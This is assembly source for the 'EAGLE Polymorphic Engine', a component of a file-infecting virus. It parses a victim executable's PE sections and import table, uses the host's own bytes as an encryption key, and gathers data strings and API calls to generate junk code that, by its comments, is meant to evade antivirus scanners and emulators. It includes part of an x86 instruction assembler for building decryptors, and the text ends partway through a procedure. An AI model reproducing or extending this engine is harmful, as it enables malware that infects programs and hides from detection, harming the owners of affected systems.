 ;-----------------------------------------------------------------------------------
 ;                                                                                  ;
 ;                      Encryption Algorithm Generator Light Engine                 ;
 ;                                                                                  ;
 ;      size : 15 kb                                                                ;
 ;                                                                                  ;
 ;-----------------------------------------------------------------------------------

 ;-=*-=-=*-=-=*-=-=*-=-=*-=-=*-=- EAGLE Polymorphic Engine V 1.00 -=*-=-=*-=-=*-=-=*-=-=*-=-=*-=-

.586
Option CaseMap:none
Include C:\masm32\include\windows.inc
Include C:\masm32\include\kernel32.inc

.Data

.Code


;Protos
;--------
initPoly Proto  :DWord,:DWord
RVAToOffset Proto :DWord,:DWord
OffsetToRVA Proto :DWord,:DWord
GetAPIsFromImport Proto :DWord,:DWord,:DWord




;Data
;------
DataSectionBegining:

;APIs needed

;Parameters:
;0-->any number
;1-->Local Variable Pointer
;2-->String Pointer
;3-->put 0
;4-->Read Ony Pointer (not used)

;Return:
;0-->Unimportant
;1-->Important

APIs:
DD 331A1645H    ;CRCName --> lstrlenA
DD 00000000H    ;VA -->null untill now
DB 1H           ;nParams-->1
DB 7            ;registers Affected --> eax,ecx,edx
DB 0            ;return -->any number
DB 2            ;Parameter1 -->string
DB 0,0,0,0

DD 201A109CH    ;CRCName --> GetTickCount
DD 00000000H    ;VA -->null untill now
DB 0H           ;nParams-->0
DB 5            ;registers Affected --> eax,edx
DB 0            ;return -->any number
DB 0,0,0,0,0

DD 300700C6H    ;CRCName --> GetCurrentProcess
DD 00000000H    ;VA -->null untill now
DB 0H           ;nParams-->0
DB 7H           ;registers Affected --> eax,ecx,edx
DB 0            ;return -->any number
DB 0
DB 0,0,0,0

DD 273D16BBH    ;CRCName --> GetCurrentProcessId
DD 00000000H    ;VA -->null untill now
DB 0H           ;nParams-->0
DB 7H           ;registers Affected --> eax,ecx,edx
DB 0            ;return -->any number
DB 0
DB 0,0,0,0

DD 2715006EH    ;CRCName --> GetCurrentThread
DD 00000000H    ;VA -->null untill now
DB 0H           ;nParams-->0
DB 7H           ;registers Affected --> eax,ecx,edx
DB 0            ;return -->any number
DB 0
DB 0,0,0,0

DD 02110B86H    ;CRCName --> GetCommandLineA
DD 00000000H    ;VA -->null untill now
DB 0H           ;nParams-->0
DB 7H           ;registers Affected --> eax,ecx,edx
DB 0            ;return -->any number
DB 0
DB 0,0,0,0

DD 06190D10H    ;CRCName --> CharNext
DD 00000000H    ;VA -->null untill now
DB 1H           ;nParams-->1
DB 7H           ;registers Affected -->  eax,ecx,edx
DB 0            ;return -->any number
DB 2            ;Parameter1 -->string
DB 0,0,0,0

DD 04041A08H    ;CRCName --> CharPrev
DD 00000000H    ;VA -->null untill now
DB 1H           ;nParams-->1
DB 7H           ;registers Affected --> eax,ecx,edx
DB 0            ;return -->any number
DB 2            ;Parameter1 -->string
DB 0,0,0,0

DD 1A260465H    ;CRCName --> IsCharLower
DD 00000000H    ;VA -->null untill now
DB 1H           ;nParams-->1
DB 7H           ;registers Affected --> eax,ecx,edx
DB 1            ;return -->save it
DB 2            ;Parameter1 -->string
DB 0,0,0,0

DD 1A26037FH    ;CRCName --> IsCharUpper
DD 00000000H    ;VA -->null untill now
DB 1H           ;nParams-->1
DB 7H           ;registers Affected --> eax,ecx,edx
DB 1            ;return -->save it
DB 2            ;Parameter1 -->string
DB 0,0,0,0

DD 3E1B178BH    ;CRCName --> GetLastError
DD 00000000H    ;VA -->null untill now
DB 0H           ;nParams-->0
DB 7H           ;registers Affected --> eax,ecx,edx
DB 0            ;return -->any number
DB 0
DB 0,0,0,0

DD 2E000479H    ;CRCName --> GetKeyState
DD 00000000H    ;VA -->null untill now
DB 1H           ;nParams-->1
DB 7H           ;registers Affected --> eax,ecx,edx
DB 0            ;return -->any number
DB 0            ;Parameter1 -->integer
DB 0,0,0,0

DD 35010608H    ;CRCName --> GetFocus
DD 00000000H    ;VA -->null untill now
DB 0H           ;nParams-->0
DB 7H           ;registers Affected --> eax,ecx,edx
DB 1            ;return -->save it
DB 0
DB 0,0,0,0

DD 311B019AH    ;CRCName --> GetForegroundWindow
DD 00000000H    ;VA -->null untill now
DB 0H           ;nParams-->0
DB 7H           ;registers Affected --> eax,ecx,edx
DB 1            ;return -->save it
DB 0
DB 0,0,0,0
;deleted due to low performance
;DD 07301185H   ;CRCName --> GetDC
;DD 00000000H   ;VA -->null untill now
;DB 1H          ;nParams-->1
;DB 7H          ;registers Affected --> eax,ecx,edx
;DB 1           ;return -->save it
;DB 3           ;Parameter1 -->put 0
;DB 0,0,0,0

;DD 301B35E5H   ;CRCName --> GetCursorPos
;DD 00000000H   ;VA -->null untill now
;DB 1H          ;nParams-->1
;DB 7H          ;registers Affected --> eax,ecx,edx
;DB 0           ;return -->any number
;DB 1           ;Parameter1 -->local variable
;DB 0,0,0,0

DD 311B16ABH    ;CRCName --> GetCursor
DD 00000000H    ;VA -->null untill now
DB 0H           ;nParams-->0
DB 7H           ;registers Affected --> eax,ecx,edx
DB 0            ;return -->any number
DB 0
DB 0,0,0,0

DD 0219101BH    ;CRCName --> lstrcmpA
DD 00000000H    ;VA -->null untill now
DB 2H           ;nParams-->2
DB 7H           ;registers Affected --> eax,ecx,edx
DB 1            ;return -->save it
DB 2            ;Parameter1 -->string
DB 2,0,0,0      ;Parameter2 -->string

DD 1B041E61H    ;CRCName --> lstrcmpiA
DD 00000000H    ;VA -->null untill now
DB 2H           ;nParams-->2
DB 7H           ;registers Affected --> eax,ecx,edx
DB 1            ;return -->save it
DB 2            ;Parameter1 -->string
DB 2,0,0,0      ;Parameter2 -->string

;Code
;------
;Keyword:InitPoly_Place
 ;-----------------------------------------------------------------------------------
 ;                                                                                  ;
 ;                                      Init Poly                                   ;
 ;                                                                                  ;
 ;-----------------------------------------------------------------------------------


;poly initialization
;return eax-->pointer to the data of the poly
;this pointer is very important for creating many instances from the poly easily by just call
;this proc as this proc allocate a place in memory to put the encryptor and the decryptor in it
;Uses nearby all registers except eax

initPoly Proc Uses Esi Edi Ecx Edx Ebx FileHandler:DWord,VirusSize:DWord,VirusRVA:DWord,VirusOffset:DWord,DecryptorPlace:DWord,EPOPtr:DWord
    Local HeapPtr:DWord
    Local SearchWith:DWord
    Local nSections:DWord

    Invoke VirtualAllocAPI, 0,SizeOf RWPolyData,MEM_COMMIT,PAGE_READWRITE
    Mov HeapPtr,Eax         ;Pointer to the data section of the poly .will be returned
    ; here we will get a list of all read only sesctions in the file
    ;this pointer are very important becauseof host key
    ;host key is a new way of encryption that take a part of the host as a key
    Mov Esi,FileHandler
    Add Esi,[Esi].IMAGE_DOS_HEADER.e_lfanew
    Push Esi
    Lea Edi,[Esi].IMAGE_NT_HEADERS.FileHeader
    Movzx Ecx,[Edi].IMAGE_FILE_HEADER.NumberOfSections  ;get number of sections
    Mov nSections,Ecx                                   ;save it
    Lea Edi,[Esi].IMAGE_NT_HEADERS.OptionalHeader
    Add Edi,SizeOf IMAGE_OPTIONAL_HEADER
    Xchg Edi,Esi
    Lea Edi,[Eax].RWPolyData.DecryptPtrs                ;here we will save the pointers needed for decryption
    Lea Edx,[Eax].RWPolyData.EncryptPtrs                ;here we will save the pointers needed for encryption

    ;check every section
    .While Ecx>0
        .If !([Esi].IMAGE_SECTION_HEADER.Characteristics & IMAGE_SCN_MEM_WRITE)
            Mov Eax,[Esi].IMAGE_SECTION_HEADER.SizeOfRawData
            Sub Eax,VirusSize                                   ;we can get an xor pointer here in this section
            .If Eax<80000000H                                   ;if it < this mean it's positive (80000000H and above are negative numbers)
                Mov Eax,[Esi].IMAGE_SECTION_HEADER.VirtualAddress   ;the address that will saved in decryptor is (virtualAddress + 00400000h)
                Add Eax,00400000H                                   ;we will save this pointer
                Mov DWord Ptr [Edi].PLACE_IN_MEMORY.VA,Eax
                Mov Eax,[Esi].IMAGE_SECTION_HEADER.PointerToRawData
                Add Eax,FileHandler                                 ;we will save this pointer
                Mov DWord Ptr [Edx].PLACE_IN_MEMORY.VA,Eax          ;the address that will saved in encryptor is (Pointer to raw data + filehandler)
                Mov Eax,[Esi].IMAGE_SECTION_HEADER.SizeOfRawData    ; the encryption will done in the infection time so the program is not loaded well (loaded only by physical address not virtual)
                Sub Eax,VirusSize
                Mov DWord Ptr [Edi].PLACE_IN_MEMORY.nSize,Eax       ;put the size
                Mov DWord Ptr [Edx].PLACE_IN_MEMORY.nSize,Eax
                Add Edi,SizeOf PLACE_IN_MEMORY                      ;next entry
                Add Edx,SizeOf PLACE_IN_MEMORY
            .EndIf
        .EndIf
        Add Esi,SizeOf IMAGE_SECTION_HEADER                 ;next section
        Dec Ecx
    .EndW
    ;let's get the count of what we get
    Invoke GetXorTableCount, HeapPtr
    Pop Esi                                             ;esi-->NT header
    ;----------------------------------------------------------------------
    ;now let's jump into finding data sections in the victim
    Add Esi,SizeOf IMAGE_NT_HEADERS                 ;reach first section
    Mov Ecx,nSections
    Mov Edi,HeapPtr
    Mov SearchWith,1
    .While Ecx>0
        .If SearchWith==1
            .If (DWord Ptr [Esi+1]== 'atad') || (DWord Ptr [Esi+2]== 'atad')    ;is it a data section
                Mov Eax,[Esi].IMAGE_SECTION_HEADER.VirtualAddress
                Add Eax,00400000H
                Mov [Edi].RWPolyData.DataSectionRVA,Eax                         ;the address of data (we will use it in GarPJ)
                Mov SearchWith,0
            .EndIf
        .Else
            .If !(DWord Ptr [Esi+1]== 'atad') && !(DWord Ptr [Esi+2]== 'atad')  ;is it not a data section?
                Mov Eax,[Esi].IMAGE_SECTION_HEADER.VirtualAddress
                Add Eax,00400000H
                Sub Eax,[Edi].RWPolyData.DataSectionRVA
                Sub Eax,4                                                       ;for security (not take a pointer to wrong place)
                Mov [Edi].RWPolyData.DataSectionSize,Eax                        ;let's save it as the end of data
            .EndIf
        .EndIf
        Add Esi,SizeOf IMAGE_SECTION_HEADER
        Dec Ecx
    .EndW
    ;----------------------------------------------------------------------
    ;now we will get the Apis from import table let's go
    ;it's one of the hardest points in the code (untill now)

    Mov Esi,FileHandler                         ;the normal beginning
    Add Esi,[Esi].IMAGE_DOS_HEADER.e_lfanew
    Mov Eax, [Esi+SizeOf IMAGE_DATA_DIRECTORY].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory.VirtualAddress
    Invoke RVAToOffset, FileHandler,Eax
    Mov Esi,Eax
    Add Esi,FileHandler
    Assume Esi:Ptr IMAGE_IMPORT_DESCRIPTOR
    ; loop untill see IMAGE_IMPORT_DESCRIPTOR every entry in it is null
    ;null terminated
    Mov Eax,HeapPtr
    Mov [Eax].RWPolyData.Temp,00000000H     ;because it will used to save a data in it

    .While !([Esi].OriginalFirstThunk==0 && [Esi].TimeDateStamp==0 && [Esi].ForwarderChain==0 && [Esi].Name1==0 && [Esi].FirstThunk==0)
        ; get the functions
        Mov Eax,[Esi].Name1
        Invoke RVAToOffset, FileHandler,Eax
        Add Eax,FileHandler
        Invoke APIChecksum, Eax
        Invoke GetAPIsFromImport, HeapPtr,FileHandler,Esi
        Add Esi,SizeOf IMAGE_IMPORT_DESCRIPTOR
    .EndW

    ;we are now get the APIs put we have 2 Problems :
    ;1- we don't know how many APIs we found
    ;2- we only have a pointer to where the Address of the API will put
    ;   but we don't have the pointer to jmp dword [XXXXXX] which we will call to it
    ;   so now we will make a loop to find them

    ;first let's begin with getting the number of APIs we have
    Mov Eax,HeapPtr
    Mov Eax,DWord Ptr [Eax].RWPolyData.Temp ;we use dword ptr because I interlize
    Mov Ecx,SizeOf API                      ;we will divide temp with API structure size
    Xor Edx,Edx                             ;set edx to 0 (important for divide)
    Div Ecx                                 ;divide it
    Mov Ecx,Eax                             ;save it
    Mov Eax,HeapPtr
    Mov [Eax].RWPolyData.APIsFound,Cl       ;we get it at last  ;)
    ;-------------
    ;let's now getting the jmp dword[XXXX] because we will points the calls to this place
    ;we will search for it in code section after we find it we will convert the pointer to this place
    ;(offset) to RVA to make the calls point there

;   Lea Edi,[Eax].RWPolyData.AvariableAPIs
;   .While Cl>0
;       Mov Eax,[Edi].API.VA
;       ;let's search for the API
;       Invoke GetSection, FileHandler,1
;       Mov Esi,[Eax].IMAGE_SECTION_HEADER.PointerToRawData
;       Add Esi,FileHandler
;       Push Ecx
;       Mov Ecx,[Eax].IMAGE_SECTION_HEADER.SizeOfRawData
;       Mov Eax,[Edi].API.VA
;       ;now esi-->pointer for the search
;       ;ecx    -->the counter let's begin
;       ;eax    -->the place where the address of the api will be placed
;       .While Ecx>0
;           .If Word Ptr [Esi]==025FFH          ;jmp dword ?
;               .If DWord Ptr [Esi+2]==Eax      ;dword[pointer to API Address] ?
;                   Mov Eax,Esi                 ;yeah we found it
;                   Invoke OffsetToRVA, FileHandler,Eax
;                   .Break
;               .Else
;                   Inc Esi                     ;Oops we don't try the next byte
;                   Dec Ecx
;               .EndIf
;           .Else
;               Inc Esi                         ;Oops we don't try the next byte
;               Dec Ecx
;           .EndIf
;       .EndW
;       Mov [Edi].API.VA,Eax                    ;save the pointer to jmp to the API
;       Add Edi,SizeOf API                      ;next API
;       Pop Ecx
;       Dec Ecx                                 ;is this thew last API?
;   .EndW
    ;----------------------------------------------------------------------------
    ;now we get all the APIs
    ;we will now jump into searching for Strings in the initialized data
    ;we will get random strings in the program not all maxiumum 10 strings
    ;this is very important for Apis Parameters as we give it to strlen and other APIs
    ;as Parameters to make AVs not see we use the API wrong ;)
    ;Sometimes we will use strlen as a way to fool some Emulators (which they don't emulate the APIs correctly)
    ;this will be discribed after that so don't worry
    ;Let's begin
    Mov Edi,HeapPtr
    Lea Edi,[Edi].RWPolyData.Strings
    Mov Ecx,0AH
    .While Ecx>0
        Invoke SearchForString,FileHandler,Edi
        .If Eax==0                              ;sucess
            Add Edi,8                           ;make edi pointing for the next entry
        .EndIf
        Dec Ecx
    .EndW
    ;let's get the number of entries
    Assume Edi:Nothing
    Assume Esi:Nothing
    Mov Esi,HeapPtr
    Lea Eax,[Esi].RWPolyData.Strings
    Sub Edi,Eax                             ;the difference
    Shr Edi,3                                   ;edi/8
    Inc Edi
    Mov [Esi].RWPolyData.NumOfStrings,Edi       ;save this number
    ;--------------------------------------------------------------------------------------------------
    ;Misc
    Mov Edi,HeapPtr
    Mov Eax,DecryptorPlace
    Mov [Edi].RWPolyData.DecryptorRVA,Eax
    Mov Eax,VirusRVA
    Mov [Edi].RWPolyData.VirusPtr,Eax
    Mov Eax,VirusOffset
    Mov [Edi].RWPolyData.VirusOffset,Eax
    Mov Eax,VirusSize
    Mov [Edi].RWPolyData.VirusSize,Eax
    Mov Eax,EPOPtr
    Mov [Edi].RWPolyData.EpoPointer,Eax
    Mov Eax,FileHandler
    Mov [Edi].RWPolyData.FileHandler,Eax
    Mov Eax,HeapPtr                             ;return HeapPtr
    Ret
initPoly EndP
; this procedure will get the apis that will be use in the GarPJ not the real Apis
;this Proc use all registers but we only need to save esi so we write "Uses Esi"
GetAPIsFromImport Proc Uses Esi HeapPtr:DWord ,FileHandler:DWord,lpImage:DWord
    Mov Esi,lpImage
    Assume Esi:Ptr IMAGE_IMPORT_DESCRIPTOR
    .If [Esi].OriginalFirstThunk !=0        ;some compilers not save the Imported Apis here
        Mov Eax,[Esi].OriginalFirstThunk
    .Else
        Mov Eax,[Esi].FirstThunk            ;so we get it form here
    .EndIf
    Invoke RVAToOffset,FileHandler,Eax
    Add Eax,FileHandler
    Mov Edi,Eax                             ;pointer to first API
    Mov Edx,[Esi].FirstThunk
    Add Edx,00400000H
    Push Esi
    Xchg Esi,Edi
    .While DWord Ptr [Esi]!=0
        Mov Edi,DWord Ptr [Esi]
        Invoke RVAToOffset, FileHandler,Edi
        Add Eax,FileHandler
        Mov Edi,Eax
        Assume Edi:Ptr IMAGE_IMPORT_BY_NAME
        Lea Eax,[Edi].Name1                 ;[Edi].Name1
        .If  !(Eax & 80000000H)             ;is it negative
        Invoke APIChecksum, Addr [Edi].Name1    ;get the checksum
        Mov Ebx,Eax
        ;now ebx -->API checkSum
        Push Esi
        Push Edi
        Mov Edi,HeapPtr
        Call GetAPIsFromImportDelta
GetAPIsFromImportDelta:
        Pop Esi
        Sub Esi,Offset GetAPIsFromImportDelta
        Add Esi,Offset APIs                     ;esi-->APIs in readonly data
        Assume Edi:Ptr RWPolyData
        Mov Ecx,MAX_NUMBER_OF_APIS
        ;we now intrilize the registers for a loop searching for the API we need
        ; when we find an api we will copy it's data to RWPolyData and put the address there
        .While Ecx!=0
            Assume Esi:Ptr API
            Mov Eax,[Esi].CRCName               ;the checksum of the api
            .If Eax==Ebx
                Push Edi
                Lea Eax,[Edi].AvariableAPIs
                Add Eax,DWord Ptr [Edi].Temp    ;to the last entry
                Mov Edi,Eax
                Xor Eax,Eax
                Mov Ecx,SizeOf API
                Rep Movsb
                Sub Edi,SizeOf API
                Mov DWord Ptr [Edi+4],Edx       ;edi+4 -->API.VA
                Pop Edi
                Add [Edi].Temp,SizeOf API       ;we add a new API let's pointing temp to the last entry
                .Break
            .EndIf
            Add Esi,SizeOf API
            Dec Ecx
        .EndW
        Pop Edi
        Pop Esi
        .EndIf
        Add Esi,4
        Add Edx,4
    .EndW
    Ret
 GetAPIsFromImport EndP

;convert the name of the Api to CRC number (this used in GetAPIsFromImport)
APIChecksum Proc Uses Edi Ecx szApiName:DWord
    Mov Edi,szApiName
    Xor Eax,Eax
    Xor Ecx,Ecx
    .While Byte Ptr [Edi]!=0
        Add Al,Byte Ptr [Edi]
        Inc Edi
        Inc Ecx
    .EndW
    Mov Edi,szApiName
    Xor Eax,DWord Ptr [Edi]
    Mov Edi,szApiName
    Add Edi,Ecx
    .If Ecx >=4
        Sub Edi,4
        Xor Eax,DWord Ptr [Edi]
    .Else
        Xor Eax,Eax
    .EndIf
    Ret
APIChecksum EndP
;this Proc will search for a string in data sections
SearchForString Proc Uses Esi Edi Ecx FileHandler:DWord,StringPtr:DWord
    Local StringFound:Byte
    Mov StringFound,0
    Xor Edx,Edx
    Invoke GetNumOfSections, FileHandler
    Mov Ecx,Eax
    .While Ecx>0
        Invoke GetSection, FileHandler,Ecx
        .If (DWord Ptr [Eax+1]=='atad') || (DWord Ptr [Eax+2]=='atad')
            .If ([Eax].IMAGE_SECTION_HEADER.Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)
                .Break
            .EndIf
        .EndIf
        Dec Ecx
    .EndW
    ;now eax pointing to a data section for searching for strings
    ;let's begin searching
    Mov Ecx,[Eax].IMAGE_SECTION_HEADER.SizeOfRawData
    Mov Esi,[Eax].IMAGE_SECTION_HEADER.PointerToRawData
    Add Esi,FileHandler
    ;GetRandomNum
    Invoke Rand, Ecx
    Add Esi,Eax
    Sub Ecx,Eax
    .While Ecx>0
        .If StringFound==0
            .If Byte Ptr [Esi]>= 20H && Byte Ptr [Esi] < 80H    ;string characters in hex
                Mov StringFound,1                               ;it seems a string
                Mov Edx,1                                       ;edx -->Size of this String
            .EndIf
        .Else
            .If Byte Ptr [Esi]>= 20H && Byte Ptr [Esi] < 80H    ;string characters in hex
                Inc Edx                                         ;another Character
            .ElseIf Byte Ptr [Esi]==0                           ;we search for null terminated String
                .If Edx>=5                                      ;we don't take a small string
                    Jmp Sucess
                .Else
                    Xor Edx,Edx                                 ;too small string
                    Mov StringFound,0
                .EndIf
            .Else
                Xor Edx,Edx                                     ;not a string let's search for another
                Mov StringFound,0
            .EndIf
        .EndIf
        Dec Ecx
        Inc Esi
    .EndW
    Mov Eax,1                                                   ;failed
    Jmp EndOfGlory                                              ;)
Sucess:
    Sub Esi,Edx                                                 ;esi-->the beginning of the string
    Invoke OffsetToRVA, FileHandler,Esi
    Mov Esi,StringPtr
    Assume Esi:Ptr PLACE_IN_MEMORY
    Mov [Esi].VA,Eax
    Mov [Esi].nSize,Edx
    Xor Eax,Eax                                                 ;Sucess
    Assume Esi:Nothing
EndOfGlory:
    Ret
SearchForString EndP
; this proc try to get the numbers of XorTables we have
;it just loop untill it find the number and put it in TableCount
GetXorTableCount Proc Uses Esi Edi Edx Ecx HeapPtr:DWord
    Mov Edi,HeapPtr
    Lea Edi,[Edi].RWPolyData.DecryptPtrs
    Xor Ecx,Ecx
    .While !(DWord Ptr [Edi]==0)
        Inc Ecx
        Add Edi,SizeOf PLACE_IN_MEMORY
    .EndW
    Mov Edi,HeapPtr
    Mov [Edi].RWPolyData.TableCount,Cl

    Ret
GetXorTableCount EndP

;------------------------------------------------------------------------------------------
;Keyword:Assembl_Place
     ;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
     ;-=-=-=                        Logic Assembler Engine                        =-=-=-
     ;-=-=-=                                v1.00                                 =-=-=-
     ;-=-=-=                                                                      =-=-=-
     ;-=-=-=    Return:                                                           =-=-=-
     ;-=-=-=                                                                      =-=-=-
     ;-=-=-=    eax-->instruction size                                            =-=-=-
     ;-=-=-=    edi-->pointer after the last byte                                 =-=-=-
     ;-=-=-=    size --> 3.4 kb                                                   =-=-=-
     ;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
     ;this is the assembler .It's full featured but it's not commented but don't worry it describes itself

Assembl Proc Uses Esi Edx Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
    Local FirstPointer:DWord
    ;Local Reg:Byte
    ;Local RM:Byte
    ;Local Flags:DWord
    ;Local disp:DWord
    ;Local imm:DWord

    Mov Edi, Pointer
    Mov FirstPointer, Edi           ;save the first pointer
    Mov Esi, Edi
    .If (Opcode <08H)
        Invoke ASMState1, Opcode,Edi,Reg,RM,Flags,Disp,Imm
    .ElseIf (Opcode<10H)
        Invoke ASMState2, Opcode,Edi,Reg,RM,Flags,Disp,Imm
    .ElseIf (Opcode<18H)
            Mov Eax,Opcode
            And Eax,00000007H       ;make it for 0 ..7
            Mov Opcode,Eax
            Invoke ASMState3, Opcode,Edi,Reg,RM,Flags,Disp,Imm
    .ElseIf (Opcode<1FH)
            Mov Eax,Opcode
            And Eax,00000007H       ;make it for 0 ..7
            Mov Opcode,Eax
            Invoke ASMState4, Opcode,Edi,Reg,RM,Flags,Disp,Imm
    .ElseIf (Opcode<28H)
            Mov Eax,Opcode
            And Eax,00000007H       ;make it for 0 ..7
            Mov Opcode,Eax
            Invoke ASMState5, Opcode,Edi,Reg,RM,Flags,Disp,Imm
    .ElseIf (Opcode<30H)
            Mov Eax,Opcode
            And Eax,00000007H       ;make it for 0 ..7
            Mov Opcode,Eax
            Invoke ASMState6, Opcode,Edi,Reg,RM,Flags,Disp,Imm
    .ElseIf (Opcode<38H)
            Mov Eax,Opcode
            And Eax,00000007H       ;make it for 0 ..7
            Mov Opcode,Eax
            Invoke ASMState7, Opcode,Edi,Reg,RM,Flags,Disp,Imm
    .ElseIf(Opcode<40H)
            Mov Eax,Opcode
            And Eax,00000007H       ;make it for 0 ..7
            Mov Opcode,Eax
            Invoke ASMState8, Opcode,Edi,Reg,RM,Flags,Disp,Imm
    .ElseIf (Opcode==40H)
            Invoke ASMMov, Opcode,Edi,Reg,RM,Flags,Disp,Imm
    .ElseIf (Opcode==41H)
            Invoke ASMTest, Opcode,Edi,Reg,RM,Flags,Disp,Imm
    .ElseIf (Opcode>41H)
            Mov Eax,Opcode
            And Eax,00000007H       ;make it for 0 ..7
            Sub Eax,2
            Mov Opcode,Eax
            Invoke ASMMisc, Opcode,Edi,Reg,RM,Flags,Disp,Imm
    .EndIf
    Mov Eax,Edi
    Sub Eax,Esi
    Ret
Assembl EndP
ModRM Proc Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord

    ;in this case there's a disp32 only

    .If Flags & RM_NOREG
        Mov Al, Reg
        Invoke SetModRM, 00, Al, 101B
        Stosb
        Mov Eax, Disp
        Stosd

    ; in this case the rm is a register only like * mov eax,ebx *

    .ElseIf Flags & RM_REG
        Invoke SetModRM, 11B, Reg, RM
        Stosb
    .ElseIf Disp == 0
        .If RM == REG_EBP                       ;no ebp in mod=0 so we will make disp=8bit
            Invoke SetModRM, 01B, Reg, RM
            Stosb
            Xor Al, Al
            Stosb
        .ElseIf RM == REG_ESP                   ;no esp in this table so we will use esp in SIB
            Invoke SetModRM, 00B, Reg, 100B
            Stosb
            Mov Al, 24H                         ;SIB byte 00100-->none & 100=ESP
            Stosb
        .Else
            Invoke SetModRM, 00B, Reg, RM
            Stosb
        .EndIf
    .ElseIf !(Disp & 0FFFFFF00H) || (Disp >0FFFFFF00H)      ;disp is 8 bit and Disp >0FFFFFF00H mean small negative
        .If RM == REG_ESP                                   ;the same as before
            Invoke SetModRM, 01B, Reg, 100B
            Stosb
            Mov Al, 24H
            Stosb
            Mov Al, Byte Ptr [Disp]
            Stosb
        .Else
            Invoke SetModRM, 01B, Reg, RM
            Stosb
            Mov Al, Byte Ptr [Disp]
            Stosb
        .EndIf
    .Else
        .If RM == REG_ESP                       ;the same as before
            Invoke SetModRM, 10B, Reg, 100B
            Stosb
            Mov Al, 24H
            Stosb
            Mov Eax, Disp
            Stosd
        .Else
            Invoke SetModRM, 10B, Reg, RM       ;here disp32
            Stosb
            Mov Eax, Disp
            Stosd
        .EndIf
    .EndIf
    Ret
ModRM EndP

;return eax-->modrm byte (also work with SIB)

SetModRM Proc Md:Byte, Reg:Byte, RM:Byte
        Xor Eax, Eax
        Mov Al, Reg
        And Al, 0000000111B
        Shl Al, 3
        Mov Ah, RM
        And Ah, 0000000111B
        Or Al, Ah
        Mov Ah, Md
        And Ah, 0000000011B
        Shl Ah, 6
        Or Al, Ah
        Xor Ah, Ah
    Ret
SetModRM EndP

ASMState1 Proc Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
        Mov Eax,Opcode
        Mov Edx,8
        Mul Edx
        .If (Reg==REG_AL) && (Flags & (BITS8) && (Flags & R_IMM))
            Add Eax,4
            Stosb
            Mov Al,Byte Ptr [Imm]
            Stosb                   ;here we will write 1 byte only
        .ElseIf (Reg==REG_EAX) && (Flags & (R_IMM))
            .If (Flags & BITS16)
                Push Eax
                Mov Eax,66H
                Stosb
                Pop Eax
                .If (Imm & 0FFFFFF00H)
                    Add Eax,5
                    Stosb
                    Mov Eax,Imm
                    Stosw
                .Else
                    Mov Al,Reg
                    Mov RM,Al
                    Or Flags,RM_REG
                    Mov Eax,83H
                    Stosb
                    Invoke ModRM, Byte Ptr[Opcode],RM,Flags,Disp
                    Mov Al ,Byte Ptr [Imm]
                    Stosb
                .EndIf
            .Else
                .If (Imm & 0FFFFFF00H)
                    Add Eax,5
                    Stosb
                    Mov Eax,Imm
                    Stosd
                .Else
                    Mov Al,Reg
                    Mov RM,Al
                    Or Flags,RM_REG
                    Mov Eax,83H
                    Stosb
                    Invoke ModRM, Byte Ptr[Opcode],RM,Flags,Disp
                    Mov Al ,Byte Ptr [Imm]
                    Stosb
                .EndIf
            .EndIf
        .ElseIf (RM==REG_EAX) && (Flags &RM_IMM) && (Flags & RM_REG) && (Flags & BITS8)
            Add Eax,4
            Stosb
            Mov Al,Byte Ptr [Imm]
            Stosb                   ;here we will write 1 byte only
        .ElseIf (RM==REG_EAX) && (Flags &RM_IMM) && (Flags & RM_REG)
            .If (Flags & BITS16)
                Push Eax
                Mov Eax,66H
                Stosb
                Pop Eax
                Add Eax,5
                Stosb
                Mov Ax,Word Ptr[Imm]
                Stosw
            .Else
                Add Eax,5
                Stosb
                Mov Eax,Imm
                Stosd
            .EndIf
        .ElseIf(Flags & (RM_IMM) || (Flags & R_IMM))
            .If (Flags & R_IMM)
                Mov Al,Reg
                Mov RM,Al
                Or Flags,RM_REG
            .EndIf
            .If (Flags & BITS8)
                Mov Eax,80H
                Stosb
                Invoke ModRM, Byte Ptr[Opcode],RM,Flags,Disp
                Mov Al,Byte Ptr[Imm]
                Stosb
            .ElseIf (Flags & BITS16)
                Mov Eax,66H
                Stosb
                Mov Eax,81H
                Stosb
                Invoke ModRM, Byte Ptr [Opcode],RM,Flags,Disp
                Mov Ax,Word Ptr [Imm]
                Stosw
            .Else
                .If (Imm & 0FFFFFF00H)
                    Mov Eax,81H
                    Stosb
                    Invoke ModRM, Byte Ptr[Opcode],RM,Flags,Disp
                    Mov Eax,Imm
                    Stosd
                .Else
                    Mov Eax,83H
                    Stosb
                    Invoke ModRM, Byte Ptr[Opcode],RM,Flags,Disp
                    Mov Al ,Byte Ptr [Imm]
                    Stosb
                .EndIf
            .EndIf
        .ElseIf (Flags & RM_R)
            .If (Flags & BITS8)
                Stosb
                Invoke ModRM, Reg,RM,Flags,Disp
            .ElseIf (Flags & BITS16)
                Push Eax
                Mov Eax,066H
                Stosb
                Pop Eax
                Add Eax,1
                Stosb
                Invoke ModRM, Reg,RM,Flags,Disp
            .Else
                Add Eax,1
                Stosb
                Invoke ModRM, Reg,RM,Flags,Disp
            .EndIf
        .ElseIf (Flags &R_RM)
            .If (Flags & BITS8)
                Add Eax,2
                Stosb
                Invoke ModRM, Reg,RM,Flags,Disp
            .ElseIf (Flags & BITS16)
                Push Eax
                Mov Eax,066H
                Stosb
                Pop Eax
                Add Eax,3
                Stosb
                Invoke ModRM, Reg,RM,Flags,Disp
            .Else
                Add Eax,3
                Stosb
                Invoke ModRM, Reg,RM,Flags,Disp
            .EndIf
        .EndIf

    Ret
ASMState1 EndP
ASMState2 Proc Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
    Mov Eax,Opcode
    And Eax,00000007H       ;make it for 0 ..7
    Mov Opcode,Eax
    .If (Flags & BITS16)
        Mov Eax,66H
        Stosb
    .EndIf
    .If(Flags & R_IMM) || (Flags & R_RM)
        Mov Al,Reg
        Mov RM,Al
